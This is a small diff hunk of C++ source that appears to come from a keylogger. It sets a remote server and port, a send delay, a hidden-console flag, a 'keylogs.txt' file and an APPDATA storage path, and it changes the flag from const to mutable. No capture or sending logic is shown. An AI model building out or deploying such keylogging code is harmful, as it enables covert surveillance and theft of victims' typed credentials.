@@ -7,7 +7,7 @@ using namespace std;
 const string SERVER = "";
 const int PORT = 5005;
 const int DELAY = 500; // milliseconds
-const bool noConsole = true;
+bool noConsole = true;
 
 string logFileName = "keylogs.txt";
 string appData = string(getenv("APPDATA")) + "\\";
